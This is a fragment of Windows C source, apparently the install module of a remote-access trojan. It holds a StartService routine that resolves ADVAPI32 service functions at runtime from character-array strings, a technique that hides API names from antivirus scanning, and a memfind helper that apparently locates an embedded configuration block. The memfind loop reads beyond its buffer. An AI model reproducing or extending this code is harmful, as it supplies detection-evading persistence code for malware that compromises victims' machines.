
#include "../Declare.h"   //动态调用库函数
#include "install.h"
#include "until.h"
#include <Shlwapi.h>

void StartService(LPCTSTR lpService)
{
    char CtxPW61[] = {'O','p','e','n','S','C','M','a','n','a','g','e','r','A','\0'};
    OpenSCManagerAT pOpenSCManagerA=(OpenSCManagerAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW61);
	SC_HANDLE hSCManager = pOpenSCManagerA( NULL, NULL,SC_MANAGER_CREATE_SERVICE );

	char HrFvD09[] = {'S','t','a','r','t','S','e','r','v','i','c','e','A','\0'};
	StartServiceAT pStartServiceA=(StartServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD09);
	char HrFvD10[] = {'C','l','o','s','e','S','e','r','v','i','c','e','H','a','n','d','l','e','\0'};
    CloseServiceHandleT pCloseServiceHandle=(CloseServiceHandleT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD10);
	char HrFvD11[] = {'O','p','e','n','S','e','r','v','i','c','e','A','\0'};
	OpenServiceAT pOpenServiceA=(OpenServiceAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD11);
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = pOpenServiceA(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			pStartServiceA(hService, 0, NULL);
			pCloseServiceHandle( hService );
		}
		pCloseServiceHandle( hSCManager );
	}
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024
